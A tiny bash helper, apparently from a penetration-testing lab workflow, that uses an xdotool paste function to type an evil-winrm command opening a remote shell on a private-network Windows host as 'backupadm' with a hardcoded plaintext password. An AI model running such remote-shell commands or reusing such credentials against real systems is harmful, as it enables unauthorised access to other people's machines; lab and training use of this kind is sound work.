#!/bin/bash

"""
Connect with Evil-WinRM as Administrator using password.
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "evil-winrm -i 172.16.8.50 -u 'backupadm' -p '!qazXSW@'"